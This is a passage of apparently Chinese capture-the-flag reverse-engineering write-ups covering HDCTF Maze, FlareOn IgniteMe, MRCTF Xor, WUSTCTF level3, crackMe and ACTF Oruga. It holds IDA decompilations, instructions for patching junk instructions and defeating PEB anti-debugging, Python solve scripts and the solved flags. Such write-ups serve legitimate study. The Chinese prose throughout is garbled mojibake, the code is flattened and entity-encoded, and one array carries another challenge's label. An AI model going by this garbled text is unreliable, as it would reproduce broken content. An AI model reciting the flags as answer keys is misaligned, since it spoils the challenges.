(cipher[i+1] - ((cipher[i] + tmp + 20) ^ ((cipher[i] &lt;&lt; 6) + 3) ^ ((cipher[i] &gt;&gt; 9) + 4) ^ 0x10))&amp;0xffffffff cipher[i] = (cipher[i] - ((cipher[i+1] + tmp + 11) ^ ((cipher[i+1] &lt;&lt; 6) + 2) ^ ((cipher[i+1] &gt;&gt; 9) + 2) ^ 0x20))&amp;0xffffffff tmp = (tmp-0x458BCD42)&amp;0xffffffffflag = &quot;&quot;for _ in cipher: flag += hex(_)[2:]print(binascii.unhexlify(flag.encode())) flag{re_is_great!} [HDCTF2019]Maze é“¾æ¥: https://buuoj.cn/challenges#[HDCTF2019]Maze EXE 32 UPXè„±å£³ IDAæ‰“å¼€åå·¦ä¾§å‡½æ•°åˆ—è¡¨ä¸­æ‰¾ä¸åˆ° main å‡½æ•° åœ¨text viewä¸­å¯ä»¥çœ‹åˆ°_mainå‡½æ•°çš„æ ‡è¯† 12jnz short near ptr loc_40102E+1call near ptr 0EC85D78Bh ä½†æ˜¯è¿™ä¸¤è¡Œæ˜æ˜¾å­˜åœ¨é—®é¢˜, åº”è¯¥æ˜¯èŠ±æŒ‡ä»¤ ç¬¬ä¸€è¡Œpatchä¸ºnop(å³é”®-&gt;Keypatch-&gt;Patcher) ç¬¬äºŒè¡Œè½¬ä¸ºæ•°æ®ä¹‹åæŠŠdb 0E8hpatchä¸ºnop ç„¶åé€‰ä¸­ main å‡½æ•°éƒ¨åˆ†è½¬ä¸ºå‡½æ•°å°±èƒ½é¡ºåˆ©åœ°æŸ¥çœ‹åç¼–è¯‘ä»£ç äº† 1234567891011121314151617181920212223242526272829303132333435363738int __cdecl main(int argc, const char **argv, const char **envp)&#123; signed int i; // [esp+10h] [ebp-14h] char v5[16]; // [esp+14h] [ebp-10h] sub_401140((int)aGoThroughTheMa); scanf(a14s, v5); for ( i = 0; i &lt;= 13; ++i ) &#123; switch ( v5[i] ) &#123; case &#x27;a&#x27;: --dword_408078; break; case &#x27;d&#x27;: ++dword_408078; break; case &#x27;s&#x27;: --dword_40807C; break; case &#x27;w&#x27;: ++dword_40807C; break; default: continue; &#125; &#125; if ( dword_408078 != 5 || dword_40807C != -4 ) &#123; sub_401140((int)aTryAgain); &#125; else &#123; sub_401140((int)aCongratulation); sub_401140((int)aHereIsTheFlagF, v5); &#125; return 0;&#125; dword_408078 = 7 dword_40807C = 0 æ¥ç€åœ¨æ•°æ®åŒºæµè§ˆå¯ä»¥çœ‹åˆ°å®šä¹‰è¿·å®«å½¢çŠ¶çš„æ•°æ® 1*******+********* ****** **** ******* **F****** ************** å› ä¸ºå­—ç¬¦ä¸²é•¿åº¦ä¸º70, åˆ™å¯ä»¥è€ƒè™‘å‡ ç§å› æ•°ç»„åˆ 12345678910*******+**-&gt;dword_408078+******* ****** **** ******* **F****** **************|vdword_40807C+ é‚£ä¹ˆå¯ä»¥å¾—åˆ°flag flag{ssaaasaassdddw} [FlareOn4]IgniteMe é“¾æ¥: https://buuoj.cn/challenges#[FlareOn4]IgniteMe EXE 32 IDAä¸­ start å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 123456789101112131415void __noreturn start()&#123; DWORD NumberOfBytesWritten; // [esp+0h] [ebp-4h] NumberOfBytesWritten = 0; hFile = GetStdHandle(0xFFFFFFF6); dword_403074 = GetStdHandle(0xFFFFFFF5); WriteFile(dword_403074, aG1v3M3T3hFl4g, 0x13u, &amp;NumberOfBytesWritten, 0); sub_4010F0(NumberOfBytesWritten); if ( sub_401050() ) WriteFile(dword_403074, aG00dJ0b, 0xAu, &amp;NumberOfBytesWritten, 0); else WriteFile(dword_403074, aN0tT00H0tRWe7r, 0x24u, &amp;NumberOfBytesWritten, 0); ExitProcess(0);&#125; å‡½æ•°sub_4010F0åŠŸèƒ½åº”è¯¥ä¸ºè¯»å–æ–‡ä»¶å¹¶å°†å†…å®¹(flag)å­˜æ”¾äºbyte_403078 å‡½æ•°sub_401050åˆ™å®ç°äº†å¯¹äºflagçš„åŠ å¯† 123456789101112131415161718192021signed int sub_401050()&#123; int v0; // ST04_4 int i; // [esp+4h] [ebp-8h] unsigned int j; // [esp+4h] [ebp-8h] char v4; // [esp+Bh] [ebp-1h] v0 = sub_401020(byte_403078); v4 = sub_401000(); for ( i = v0 - 1; i &gt;= 0; --i ) &#123; byte_403180[i] = v4 ^ byte_403078[i]; v4 = byte_403078[i]; &#125; for ( j = 0; j &lt; 0x27; ++j ) &#123; if ( byte_403180[j] != (unsigned __int8)byte_403000[j] ) return 0; &#125; return 1;&#125; å¯†æ–‡ç»“æœå­˜æ”¾äºbyte_403000 1234567byte_403000 = [0x0D, 0x26, 0x49, 0x45, 0x2A, 0x17, 0x78, 0x44, 0x2B, 0x6C, 0x5D, 0x5E, 0x45, 0x12, 0x2F, 0x17, 0x2B, 0x44, 0x6F, 0x6E, 0x56, 0x09, 0x5F, 0x45, 0x47, 0x73, 0x26, 0x0A, 0x0D, 0x13, 0x17, 0x48, 0x42, 0x01, 0x40, 0x4D, 0x0C, 0x02, 0x69] 1234__int16 sub_401000()&#123; return (unsigned __int16)__ROL4__(-2147024896, 4) &gt;&gt; 1;&#125; v4çš„å€¼æ¥è‡ªäºå‡½æ•°sub_401000 __ROL4__ç”¨äºå¾ªç¯å·¦ç§»å››ä½ æ‰‹åŠ¨è®¡ç®—å¯ä»¥å¾—åˆ°ç»“æœ0x00380004 ç”±äºè¿”å›å€¼çš„æ•°æ®ç±»å‹æ˜¯unsigned __int16, åˆ™ä¼šè¿”å›ä½16ä½çš„æ•°æ® å³0x0004 12345678910111213141516171819#!/usr/bin/env python3cipher = [0x0D, 0x26, 0x49, 0x45, 0x2A, 0x17, 0x78, 0x44, 0x2B, 0x6C, 0x5D, 0x5E, 0x45, 0x12, 0x2F, 0x17, 0x2B, 0x44, 0x6F, 0x6E, 0x56, 0x09, 0x5F, 0x45, 0x47, 0x73, 0x26, 0x0A, 0x0D, 0x13, 0x17, 0x48, 0x42, 0x01, 0x40, 0x4D, 0x0C, 0x02, 0x69]tmp = 0x04_flag = []for _ in cipher[::-1]: plain = _^tmp _flag.append(plain) tmp = plain_flag = _flag[::-1]flag = &quot;&quot;for _ in _flag: flag += chr(_)print(flag) flag{R_y0u_H0t_3n0ugH_t0_1gn1t3@flare-on.com} [BJDCTF2020]BJD hamburger competition é“¾æ¥: https://buuoj.cn/challenges#[BJDCTF2020]BJD hamburger competition .NET ä½¿ç”¨dnSpyæ‰“å¼€Assembly-CSharp.dll åœ¨å·¦ä¾§ç¨‹åºé›†èµ„æºç®¡ç†å™¨ä¸­ä¾æ¬¡æ‰“å¼€ Assembly-CSharp-&gt;--&gt;ButtonSpawnFruit-&gt;Spawn() å¯ä»¥çœ‹åˆ°å¦‚ä¸‹ä»£ç  1234567Init.secret ^= 127;string str = Init.secret.ToString();if (ButtonSpawnFruit.Sha1(str) == &quot;DD01903921EA24941C26A48F2CEC24E0BB0E8CC7&quot;)&#123; this.result = &quot;BJDCTF&#123;&quot; + ButtonSpawnFruit.Md5(str) + &quot;&#125;&quot;; Debug.Log(this.result);&#125; å…¶ä¸­æœ‰ä¸€ä¸ªå‘, å‡½æ•°MD5çš„ä»£ç å¦‚ä¸‹æ‰€ç¤º 1234567891011public static string Md5(string str)&#123; byte[] bytes = Encoding.UTF8.GetBytes(str); byte[] array = MD5.Create().ComputeHash(bytes); StringBuilder stringBuilder = new StringBuilder(); foreach (byte b in array) &#123; stringBuilder.Append(b.ToString(&quot;X2&quot;)); &#125; return stringBuilder.ToString().Substring(0, 20);&#125; è¿”å›çš„ç»“æœä¸ºMD5å‰20ä½ ä¸”ToString(&quot;X2&quot;)å°†å­—ç¬¦ä¸²è½¬ä¸ºå¤§å†™ 123456#!/usr/bin/env python3import hashlibfor i in range(100000): if hashlib.sha1(str(i).encode()).hexdigest().upper() == &quot;DD01903921EA24941C26A48F2CEC24E0BB0E8CC7&quot;: print(&quot;flag&#123;&quot;+hashlib.md5(str(i).encode()).hexdigest()[:20].upper()+&quot;&#125;&quot;) break flag{B8C37E33DEFDE51CF91E} [MRCTF2020]Xor é“¾æ¥: https://buuoj.cn/challenges#[MRCTF2020]Xor EXE 32 IDAä¸­ä¸èƒ½ç›´æ¥æ‰¾åˆ°å…³äºflagåŠ å¯†çš„å‡½æ•° æ ¹æ®ç¨‹åºæ‰€è¾“å‡ºçš„å­—ç¬¦ä¸²Give Me Your Flag String: åœ¨IDAä¸­è¿›è¡Œæœç´¢(Search-&gt;sequence of bytes) æ‰¾åˆ°å¯¹åº”çš„æ•°æ®éƒ¨åˆ†, ç„¶åæ‰¾åˆ°è°ƒç”¨è¯¥æ•°æ®çš„å‡½æ•° 123456789101112131415161718192021222324252627int sub_401090()&#123; unsigned int v0; // eax sub_401020((int)&quot;Give Me Your Flag String:\\n&quot;); sub_401050((int)&quot;%s&quot;, byte_4212C0, 100); if ( strlen(byte_4212C0) != 27 ) &#123;LABEL_6: sub_401020((int)&quot;Wrong!\\n&quot;); sub_404B7E(&quot;pause&quot;); sub_40355F(0); __debugbreak(); JUMPOUT(*(_DWORD *)__security_check_cookie); &#125; v0 = 0; do &#123; if ( ((unsigned __int8)v0 ^ (unsigned __int8)byte_4212C0[v0]) != byte_41EA08[v0] ) goto LABEL_6; ++v0; &#125; while ( v0 &lt; 0x1B ); sub_401020((int)&quot;Right!\\n&quot;); sub_404B7E(&quot;pause&quot;); return 0;&#125; 123456#!/usr/bin/env python3cipher = &quot;MSAWB~FXZ:J:`tQJ\\&quot;N@ bpdd&#125;8g&quot;flag = &quot;&quot;for _ in range(len(cipher)): flag += chr(_^ord(cipher[_]))print(flag) flag{@_R3@1ly_E2_R3verse!} [MRCTF2020]hello_world_go é“¾æ¥: https://buuoj.cn/challenges#[MRCTF2020]hello_world_go ELF 64 IDAä¸­ main_main å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990__int64 __fastcall main_main(__int64 a1, __int64 a2)&#123; __int64 v2; // r8 __int64 v3; // r9 __int64 v4; // r8 __int64 v5; // r9 __int64 v6; // rdx __int64 v7; // r8 __int64 v8; // rcx __int64 v9; // rdx __int64 v10; // r9 signed __int64 v11; // rax __int64 result; // rax __int64 v13; // ST58_8 __int64 *v14; // [rsp+8h] [rbp-A8h] char v15; // [rsp+18h] [rbp-98h] __int64 *v16; // [rsp+60h] [rbp-50h] __int128 v17; // [rsp+68h] [rbp-48h] __int128 v18; // [rsp+78h] [rbp-38h] __int128 v19; // [rsp+88h] [rbp-28h] __int128 v20; // [rsp+98h] [rbp-18h] if ( (unsigned __int64)&amp;v18 + 8 &lt;= *(_QWORD *)(__readfsqword(0xFFFFFFF8) + 16) ) runtime_morestack_noctxt(); runtime_newobject(a1, a2); v16 = v14; *(_QWORD *)&amp;v20 = &amp;unk_4AC9C0; *((_QWORD *)&amp;v20 + 1) = &amp;off_4EA530; fmt_Fprint(a1, a2, (__int64)&amp;v20, (__int64)&amp;unk_4AC9C0, v2, v3, (__int64)&amp;go_itab__os_File_io_Writer, os_Stdout); *(_QWORD *)&amp;v19 = &amp;unk_4A96A0; *((_QWORD *)&amp;v19 + 1) = v16; fmt_Fscanf( a1, a2, (__int64)&amp;go_itab__os_File_io_Reader, (__int64)&amp;v19, v4, v5, (__int64)&amp;go_itab__os_File_io_Reader, os_Stdin, (__int64)&amp;unk_4D07C9, 2LL); v8 = v16[1]; if ( v8 != 24 ) goto LABEL_3; v13 = *v16; runtime_memequal(a1, a2, v6, (unsigned __int64)&amp;unk_4D3C58); if ( !v15 ) &#123; v8 = 24LL;LABEL_3: runtime_cmpstring(a1, a2, (__int64)&amp;unk_4D3C58, v8, v7); if ( (signed __int64)&amp;v19 &gt;= 0 ) v11 = 1LL; else v11 = -1LL; goto LABEL_5; &#125; v11 = 0LL;LABEL_5: if ( v11 ) &#123; *(_QWORD *)&amp;v17 = &amp;unk_4AC9C0; *((_QWORD *)&amp;v17 + 1) = &amp;off_4EA550; result = fmt_Fprintln( a1, a2, v9, (__int64)&amp;go_itab__os_File_io_Writer, v7, v10, (__int64)&amp;go_itab__os_File_io_Writer, os_Stdout); &#125; else &#123; *(_QWORD *)&amp;v18 = &amp;unk_4AC9C0; *((_QWORD *)&amp;v18 + 1) = &amp;off_4EA540; result = fmt_Fprintln( a1, a2, v9, (__int64)&amp;go_itab__os_File_io_Writer, v7, v10, (__int64)&amp;go_itab__os_File_io_Writer, os_Stdout); &#125; return result;&#125; å‡½æ•°runtime_cmpstringçœ‹ç€æœ‰äº›é—®é¢˜ è·Ÿè¿›unk_4D3C58å¾—åˆ°flag flag{hello_world_gogogo} [WUSTCTF2020]level3 é“¾æ¥: https://buuoj.cn/challenges#[WUSTCTF2020]level3 ELF 64 IDAä¸­ main å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 123456789101112131415161718192021222324252627int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v3; // ST0F_1 char *v4; // rax char v6; // [rsp+10h] [rbp-40h] unsigned __int64 v7; // [rsp+48h] [rbp-8h] v7 = __readfsqword(0x28u); printf(&quot;Try my base64 program?.....\\n&gt;&quot;, argv, envp); __isoc99_scanf(&quot;%20s&quot;, &amp;v6); v3 = time(0LL); srand(v3); if ( rand() &amp; 1 ) &#123; v4 = base64_encode(&amp;v6); puts(v4); puts(&quot;Is there something wrong?&quot;); &#125; else &#123; puts(&quot;Sorry I think it&#x27;s not prepared yet....&quot;); puts(&quot;And I get a strange string from my program which is different from the standard base64:&quot;); puts(&quot;d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD==&quot;); puts(&quot;What&#x27;s wrong??&quot;); &#125; return 0;&#125; çœ‹åˆ°ä¸€æ®µBase64ç¼–ç , ä½†æ˜¯ä¸èƒ½è§£ç å¾—åˆ°flag è·Ÿè¿›å‡½æ•°base64_encode æ²¡æœ‰çœ‹åˆ°æ˜æ˜¾çš„åŠ å¯†å‡½æ•°æˆ–æ›¿æ¢è¡¨å‡½æ•°, é€†å‘Base64ç¼–ç çš„å…·ä½“æ­¥éª¤æœ‰äº›éº»çƒ¦, è¿™é‡Œé‡‡ç”¨äº†æ›²çº¿æ•‘å›½çš„æ–¹æ¡ˆ 12345678./attachment Try my base64 program?.....&gt;000HQTwIs there something wrong?------echo -n &quot;000&quot; | base64MDAw é€šè¿‡è¿™ä¸€æ­¥çš„æ“ä½œæˆ‘ä»¬å¯ä»¥å¾—åˆ°ä¸‰ä¸ªå­—ç¬¦çš„æ›¿æ¢å…³ç³», é‚£ä¹ˆåªè¦æ›´æ”¹è¾“å…¥å†…å®¹å¹¶ä¸”é‡å¤æ¬¡æ•°è¶³å¤Ÿå¤š, å°±èƒ½å¤Ÿfuzzå‡ºå®Œæ•´çš„æ›¿æ¢å…³ç³» 123456789101112131415161718192021222324252627282930313233#!/usr/bin/env python3from pwn import *import base64import reimport stringdic = string.ascii_lowercase+string.ascii_uppercase+string.digitslength = len(dic)string1 = &quot;&quot;string2 = &quot;&quot;for _ in dic: test = _*3 test_b64 = base64.b64encode(test.encode()).decode() lst_res = [] while lst_res == []: p = process(&quot;./attachment&quot;) p.recv() p.sendline(test) res = p.recv().decode() lst_res = re.findall(&quot;&gt;(.*?)\\nIs there something wrong?&quot;, res) p.close() res_b64 = lst_res[0] for _ in range(len(res_b64)): if res_b64[_] != test_b64[_] and test_b64[_] not in string1 and res_b64[_] not in string2 : string1 += test_b64[_] string2 += res_b64[_]cipher = &quot;d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD==&quot;flag = &quot;&quot;for _ in cipher: if _ in string2: flag += string1[string2.index(_)] else: flag += _print(base64.b64decode(flag.encode())) flag{Base64_is_the_start_of_reverse} [WUSTCTF2020]Cr0ssfun é“¾æ¥: https://buuoj.cn/challenges#[WUSTCTF2020]Cr0ssfun ELF 64 IDAä¸­ main å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 1234567891011121314151617181920212223int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [rsp+0h] [rbp-30h] puts(&quot; _ _ _ _ _____ _____ _____ &quot;); puts(&quot;| | | | | | / ___|_ _| / ___| &quot;); puts(&quot;| | | | | | \\\\ `--. | | \\\\ `--. ___ ___ &quot;); puts(&quot;| |/\\\\| | | | |`--. \\\\ | | `--. \\\\/ _ \\\\/ __|&quot;); puts(&quot;\\\\ /\\\\ / |_| /\\\\__/ / | | /\\\\__/ / __/ (__ &quot;); puts(&quot; \\\\/ \\\\/ \\\\___/\\\\____/ \\\\_/ \\\\____/ \\\\___|\\\\___|&quot;); while ( 1 ) &#123; puts(&quot;Input the flag&quot;); __isoc99_scanf(&quot;%s&quot;, &amp;v4); if ( (unsigned int)check(&amp;v4) == 1 ) break; puts(&quot;0ops, your flag seems fake.&quot;); puts(&quot;==============================&quot;); rewind(_bss_start); &#125; puts(&quot;Your flag is correct, go and submit it!&quot;); return 0;&#125; è·Ÿè¿›å‡½æ•°Checkä»¥åŠä¹‹åçš„å‡½æ•°å³å¯å¾—åˆ°flag flag{cpp_@nd_r3verse_@re_fun} [[FlareOn6]Overlong é“¾æ¥: https://buuoj.cn/challenges#[FlareOn6]Overlong EXE 32 IDAä¸­ start å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 123456789101112int __stdcall start(int a1, int a2, int a3, int a4)&#123; int v4; // eax CHAR Text[128]; // [esp+0h] [ebp-84h] int v7; // [esp+80h] [ebp-4h] v4 = sub_401160(Text, &amp;unk_402008, 28); v7 = v4; Text[v4] = 0; MessageBoxA(0, Text, Caption, 0); return 0;&#125; unk_402008çš„é•¿åº¦ä¸º175, å³0xAF ä½†æ˜¯æ‰€é™å®šçš„é•¿åº¦ä¸º28 æ‰€ä»¥flagåº”è¯¥å°±åœ¨åé¢çš„å†…å®¹ä¹‹ä¸­ é™è°ƒçœ‹ä»£ç çš„è¯è¿‡äºå¤æ‚, è¿™é¢˜åº”è¯¥ç”¨åŠ¨è°ƒ ä¸€å¼€å§‹æ‰“ç®—æŠŠpush 1ChPatchæˆpush AFh ä½†æ˜¯å‘ç°è¦åœ¨IDAä¸­æ”¹æˆAFçš„è¯ä¼šå¼ºåˆ¶è½¬æˆdword, ç„¶åå¤šä½™çš„ä¸‰ä¸ª'\\x00'å­—èŠ‚ä¼šå ç”¨æ‰åé¢ä¸€æ¡æ±‡ç¼–ä»£ç çš„ç©ºé—´ ç”¨ODè°ƒè¯•, åœ¨ç›´æ¥ä¿®æ”¹æ±‡ç¼–ä»£ç æ—¶åŒæ ·å‡ºç°äº†ä¸IDAä¸­ç›¸åŒçš„é—®é¢˜ æ‰€ä»¥å¯ä»¥åœ¨æ•°æ®è¢«PUSHå…¥æ ˆä¹‹åå†å¯¹æ ˆå†…çš„æ•°æ®è¿›è¡Œä¿®æ”¹ å½“ç„¶ä½ å®Œå…¨å¯ä»¥æ‹¿ä¸€ä¸ªåå…­è¿›åˆ¶ç¼–è¾‘å™¨ç›´æ¥ä¿®æ”¹å­—èŠ‚ç  flag{I_a_M_t_h_e_e_n_C_o_D_i_n_g@flare-on.com} crackMe é“¾æ¥: https://buuoj.cn/challenges#crackMe EXE 32 IDAä¸­ _wmain å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253int wmain()&#123; FILE *v0; // eax FILE *v1; // eax char v3; // [esp+3h] [ebp-405h] char v4; // [esp+4h] [ebp-404h] BYREF char v5[255]; // [esp+5h] [ebp-403h] BYREF char Format; // [esp+104h] [ebp-304h] BYREF char v7[255]; // [esp+105h] [ebp-303h] BYREF char v8; // [esp+204h] [ebp-204h] BYREF char v9[255]; // [esp+205h] [ebp-203h] BYREF char v10; // [esp+304h] [ebp-104h] BYREF char v11[255]; // [esp+305h] [ebp-103h] BYREF printf(&quot;Come one! Crack Me~~~\\n&quot;); v10 = 0; memset(v11, 0, sizeof(v11)); v8 = 0; memset(v9, 0, sizeof(v9)); while ( 1 ) &#123; do &#123; do &#123; printf(&quot;user(6-16 letters or numbers):&quot;); scanf(&quot;%s&quot;, &amp;v10); v0 = (FILE *)sub_4024BE(); fflush(v0); &#125; while ( !(unsigned __int8)sub_401000(&amp;v10) ); printf(&quot;password(6-16 letters or numbers):&quot;); scanf(&quot;%s&quot;, &amp;v8); v1 = (FILE *)sub_4024BE(); fflush(v1); &#125; while ( !(unsigned __int8)sub_401000(&amp;v8) ); sub_401090(&amp;v10); Format = 0; memset(v7, 0, sizeof(v7)); v4 = 0; memset(v5, 0, sizeof(v5)); v3 = ((int (__cdecl *)(char *, char *))loc_4011A0)(&amp;Format, &amp;v4); if ( sub_401830((int)&amp;v10, &amp;v8) ) &#123; if ( v3 ) break; &#125; printf(&amp;v4); &#125; printf(&amp;Format); return 0;&#125; å‡½æ•°sub_401090ç”¨äºé€šè¿‡è¾“å…¥çš„username, æ¥ç”Ÿæˆbyte_416050 ä»£ç å—loc_4011A0è¢«æ’å…¥äº†èŠ±æŒ‡ä»¤ 12.text:004011EA jbe near ptr loc_4011EA+2.text:004011F0 aaa nopæ‰è¿™ä¸¤è¡Œå°±èƒ½è½¬ä¸ºå‡½æ•°äº† å‡½æ•°sub_401830ç”¨äºæ ¡éªŒæ‰€è¾“å…¥çš„ç”¨æˆ·åä¸å¯†ç æ˜¯å¦æ­£ç¡® 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778bool __cdecl sub_401830(int a1, const char *a2)&#123; int v3; // [esp+18h] [ebp-22Ch] int v4; // [esp+1Ch] [ebp-228h] int v5; // [esp+28h] [ebp-21Ch] unsigned int v6; // [esp+30h] [ebp-214h] char v7; // [esp+36h] [ebp-20Eh] char v8; // [esp+37h] [ebp-20Dh] char v9; // [esp+38h] [ebp-20Ch] unsigned __int8 v10; // [esp+39h] [ebp-20Bh] unsigned __int8 v11; // [esp+3Ah] [ebp-20Ah] char v12; // [esp+3Bh] [ebp-209h] int v13; // [esp+3Ch] [ebp-208h] BYREF char v14; // [esp+40h] [ebp-204h] BYREF char v15[255]; // [esp+41h] [ebp-203h] BYREF char v16; // [esp+140h] [ebp-104h] BYREF char v17[255]; // [esp+141h] [ebp-103h] BYREF v4 = 0; v5 = 0; v11 = 0; v10 = 0; v16 = 0; memset(v17, 0, sizeof(v17)); v14 = 0; memset(v15, 0, sizeof(v15)); v9 = 0; v6 = 0; v3 = 0; while ( v6 &lt; strlen(a2) ) &#123; if ( isdigit(a2[v6]) ) &#123; v8 = a2[v6] - 48; &#125; else if ( isxdigit(a2[v6]) ) &#123; if ( *((_DWORD *)NtCurrentPeb()-&gt;SubSystemData + 3) != 2 ) a2[v6] = 34; v8 = (a2[v6] | 0x20) - 87; &#125; else &#123; v8 = ((a2[v6] | 0x20) - 97) % 6 + 10; &#125; __rdtsc(); __rdtsc(); v9 = v8 + 16 * v9; if ( !((int)(v6 + 1) % 2) ) &#123; *(&amp;v14 + v3++) = v9; v9 = 0; &#125; ++v6; &#125; while ( v5 &lt; 8 ) &#123; v10 += byte_416050[++v11]; v12 = byte_416050[v11]; v7 = byte_416050[v10]; byte_416050[v10] = v12; byte_416050[v11] = v7; if ( ((int)NtCurrentPeb()-&gt;UnicodeCaseTableData &amp; 0x70) != 0 ) v12 = v10 + v11; *(&amp;v16 + v5) = byte_416050[(unsigned __int8)(v7 + v12)] ^ *(&amp;v14 + v4); if ( (unsigned __int8)*(_DWORD *)&amp;NtCurrentPeb()-&gt;BeingDebugged ) &#123; v10 = 0xAD; v11 = 43; &#125; sub_401710(&amp;v16, a1, v5++); v4 = v5; if ( v5 &gt;= (unsigned int)(&amp;v14 + strlen(&amp;v14) + 1 - v15) ) v4 = 0; &#125; v13 = 0; sub_401470(&amp;v16, &amp;v13); return v13 == 0xAB94;&#125; è¿™ä¸ªå‡½æ•°ä½¿ç”¨äº†PEBæ¥è¿›è¡Œåè°ƒè¯•, å…·ä½“æƒ…å†µå¯ä»¥çœ‹è¿™ä¸ªæ–‡ç«  Reverse_PEB ç¬¬ä¸€éƒ¨åˆ†çš„whileå¾ªç¯ç”¨äºå°†å¯†ç è½¬ä¸ºåå…­è¿›åˆ¶å­—ç¬¦ä¸²å¾—åˆ°v14 ç¬¬äºŒéƒ¨åˆ†çš„whileå¾ªç¯ç”¨äºåŠ å¯† åŠ å¯†ç»“æœv16éœ€è¦ç»è¿‡å‡½æ•°sub_401470çš„æ ¡éªŒ, è¦æ±‚çš„v16=&quot;dbappsec&quot; *(&amp;v16 + v5) = byte_416050[(unsigned __int8)(v7 + v12)] ^ *(&amp;v14 + v4); v16å·²çŸ¥, åªéœ€è¦å¾—åˆ°byte_416050, ä½†æ˜¯ç”¨äºåŠ å¯†çš„byte_416050ä¼šåœ¨åŠ å¯†ä¹‹å‰è¿›è¡Œä¸€ç³»åˆ—çš„æ“ä½œ å¯ä»¥ä½¿ç”¨åŠ¨è°ƒçš„æ–¹æ³•, å¾—åˆ°çœŸæ­£ç”¨äºåŠ å¯†çš„æ•°æ® 1.text:00401B3E xor eax, ecx Debuggerä¸­åœ¨è¿™æ¡è¯­å¥ä¸‹æ–­ç‚¹, ECXå³ä¸ºæ‰€éœ€çš„æ•°æ® 123456789#!/usr/bin/env python3import hashlib_416050 = [0x2A, 0xD7, 0x92, 0xE9, 0x53, 0xE2, 0xE4, 0xCD]v17 = &quot;dbappsec&quot;passwd = &quot;&quot;for _ in range(len(v17)): passwd += hex(ord(v17[_])^_416050[_])[2:]flag = &quot;flag&#123;&quot; + hashlib.md5(passwd.encode()).hexdigest() + &quot;&#125;&quot;print(flag) flag{43097184c2f63f7bcabdadf21b693c8e} [ACTFæ–°ç”Ÿèµ›2020]Oruga é“¾æ¥: https://buuoj.cn/challenges#[ACTFæ–°ç”Ÿèµ›2020]Oruga ELF 64 IDAä¸­ main å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 1234567891011121314151617181920212223242526272829303132__int64 __fastcall main(int a1, char **a2, char **a3)&#123; __int64 result; // rax int i; // [rsp+0h] [rbp-40h] char s1[6]; // [rsp+4h] [rbp-3Ch] BYREF char s2[6]; // [rsp+Ah] [rbp-36h] BYREF char s[40]; // [rsp+10h] [rbp-30h] BYREF unsigned __int64 v8; // [rsp+38h] [rbp-8h] v8 = __readfsqword(40u); memset(s, 0, 25uLL); printf(&quot;Tell me the flag:&quot;); scanf(&quot;%s&quot;, s); strcpy(s2, &quot;actf&#123;&quot;); for ( i = 0; i &lt;= 4; ++i ) s1[i] = s[i]; s1[5] = 0; if ( !strcmp(s1, s2) ) &#123; if ( sub_78A((__int64)s) ) printf(&quot;That&#x27;s True Flag!&quot;); else printf(&quot;don&#x27;t stop trying...&quot;); result = 0LL; &#125; else &#123; printf(&quot;Format false!&quot;); result = 0LL; &#125; return result;&#125; å‡½æ•°sub_78Aç”¨äºæ ¡éªŒflag 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152_BOOL8 __fastcall sub_78A(__int64 a1)&#123; int v2; // [rsp+Ch] [rbp-Ch] int v3; // [rsp+10h] [rbp-8h] int v4; // [rsp+14h] [rbp-4h] v2 = 0; v3 = 5; v4 = 0; while ( byte_201020[v2] != 0x21 ) &#123; v2 -= v4; if ( *(_BYTE *)(v3 + a1) != &#x27;W&#x27; || v4 == -16 ) &#123; if ( *(_BYTE *)(v3 + a1) != &#x27;E&#x27; || v4 == 1 ) &#123; if ( *(_BYTE *)(v3 + a1) != &#x27;M&#x27; || v4 == 16 ) &#123; if ( *(_BYTE *)(v3 + a1) != &#x27;J&#x27; || v4 == -1 ) return 0LL; v4 = -1; &#125; else &#123; v4 = 16; &#125; &#125; else &#123; v4 = 1; &#125; &#125; else &#123; v4 = -16; &#125; ++v3; while ( !byte_201020[v2] ) &#123; if ( v4 == -1 &amp;&amp; (v2 &amp; 0xF) == 0 ) return 0LL; if ( v4 == 1 &amp;&amp; v2 % 16 == 15 ) return 0LL; if ( v4 == 16 &amp;&amp; (unsigned int)(v2 - 240) &lt;= 15 ) return 0LL; if ( v4 == -16 &amp;&amp; (unsigned int)(v2 + 15) &lt;= 30 ) return 0LL; v2 += v4; &#125; &#125; return *(_BYTE *)(v3 + a1) == &#x27;&#125;&#x27;;&#125; byte_201020å¦‚ä¸‹ 1234567891011121314151617_416050 = [0x00, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x23, 0x23, 0x23, 0x23, 0x00, 0x00, 0x00, 0x23, 0x23, 0x00, 0x00, 0x00, 0x4F, 0x4F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4F, 0x4F, 0x00, 0x50, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x00, 0x4F, 0x4F, 0x00, 0x4F, 0x4F, 0x00, 0x50, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x00, 0x4F, 0x4F, 0x00, 0x4F, 0x4F, 0x00, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x4C, 0x00, 0x4F, 0x4F, 0x00, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4F, 0x4F, 0x00, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x00, 0x00, 0x00, 